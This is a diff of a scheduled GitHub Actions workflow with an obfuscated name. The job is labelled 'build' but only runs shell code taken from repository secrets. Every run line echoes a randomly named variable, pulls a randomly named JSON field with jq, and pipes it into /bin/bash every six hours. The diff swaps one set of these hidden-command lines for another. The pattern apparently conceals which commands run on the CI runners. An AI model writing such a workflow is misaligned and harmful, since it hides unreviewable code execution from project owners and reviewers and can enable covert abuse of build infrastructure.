@@ -3,7 +3,7 @@ name: swimmingsardonic
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 4/6 * * *'
+    - cron: '57 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: swimmingsardonic
         env:
-          n21: ${{ secrets.n21 }}
+          cr0: ${{ secrets.cr0 }}
         run: |
-          echo $n21 | jq -r .eklf4 | /bin/bash
-          echo $yl6 | jq -r .anf35 | /bin/bash
-          echo $dccr61 | jq -r .d218 | /bin/bash
-          echo $wr57 | jq -r .mwik9757 | /bin/bash
-          echo $fvzqq1565 | jq -r .np06 | /bin/bash
-          echo $tp2562 | jq -r .ux1 | /bin/bash
-          echo $cfao446 | jq -r .sfkq269 | /bin/bash
-          echo $djcxw96907 | jq -r .z51 | /bin/bash
-          echo $tljzr14474 | jq -r .ntpav1 | /bin/bash
+          echo $cr0 | jq -r .zzoa1393 | /bin/bash
+          echo $mehgg02901 | jq -r .vui81 | /bin/bash
+          echo $jef050 | jq -r .j11 | /bin/bash
+          echo $ut18 | jq -r .z8 | /bin/bash
 
